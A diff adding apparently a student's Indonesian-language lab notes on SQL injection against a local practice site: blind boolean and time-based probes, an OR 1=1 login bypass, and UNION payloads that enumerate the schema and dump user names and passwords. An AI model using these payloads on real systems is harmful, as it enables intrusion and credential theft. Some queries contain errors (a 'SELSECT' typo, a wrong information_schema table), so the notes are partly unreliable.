@@ -1,0 +1,68 @@
+sql injection -> kita inject sebuah sql statement yang salah
+
+blind sql inkection
+- boolean based
+        AND 1=2
+        AND 1=1
+select * from posts where id = $id AND 1=2
+
+-time based
+    SLEEP() -> return 0 kalo berhasil SLEEP
+    return 1 kalo diinterupsi
+    http://localhost/lab/sesi11/post.php?id=1-IF(database()='session10',SLEEP(5),0)
+    akan check 2 huruf pertama dari DB nya bila lag maka sudah dapet 2 huruf awal
+    http://localhost/lab/sesi11/post.php?id=1-IF(LEFT(database(),2)='se',SLEEP(5),0)
+
+
+in band sql injection   
+    error based (login)
+        inject sql statement yang bikin error
+        OR 1=1
+SELECT * FROM `users` WHERE name ="Bambang" AND password = "Bambang" OR 1=1;
+SELECT * FROM `users` WHERE name ='' OR 1=1' AND password = 'asd' -> akan bermasalah karena AND password = diapit 2 '(titik) 
+SELECT * FROM `users` WHERE name ='' OR 1=1#' AND password = 'asd'
+SELECT * FROM `users` WHERE name ='' OR 1=1 LIMIT 1#' AND password = 'asd'
+        LIMIT untuk menghindari nyangkut di num_rows 
+
+
+Union
+diinject lalu otak-atik resultnya
+
+    SELECT * FROM `users` WHERE id = 1
+    UNION
+    SELECT * FROM `users` WHERE id = 2;
+
+        untuk mencari tahu jumlah row nya
+        SELECT * FROM `posts` WHERE id = 1
+        UNION
+        SELECT 1,2,3,4,5,6
+        id= -1 karena biar kosong sehingga kita bisa liat jumlah kolom
+        http://localhost/lab/sesi11/post.php?id=-1
+        UNION
+        SELECT 1,2,3,4,5,6
+        memunculkan nama users
+        http://localhost/lab/sesi11/post.php?id=-1
+        UNION
+        SELECT 1,name,3,4,5,6 FROM users WHERE id = 1
+        menampilkan nama DB yang ada karean schema ini menunjukkan DB nya ada apa aja
+        http://localhost/lab/sesi11/post.php?id=-1
+        UNION
+        SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6 FROM information_schema.SCHEMATA
+        melihat skema table dari session10
+        http://localhost/lab/sesi11/post.php?id=-1
+        UNION
+        SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.SCHEMATA WHERE table_schema = "session10"
+
+        http://localhost/lab/sesi11/post.php?id=-1
+        UNION
+        SELECT 1,GROUP_CONCAT(column_name),3,4,5,6 FROM information_schema.columns WHERE TABLE_NAME = "posts" AND TABLE_SCHEMA = "session10"
+
+        http://localhost/lab/sesi11/post.php?id=-1 UNION SELSECT 1,GROUP_CONCAT(name),GROUP_CONCAT(password),4,5,6 FROM session10.users
+
+
+        id,name,password
+
+        session10
+
+        GROUP_CONCAT
+        
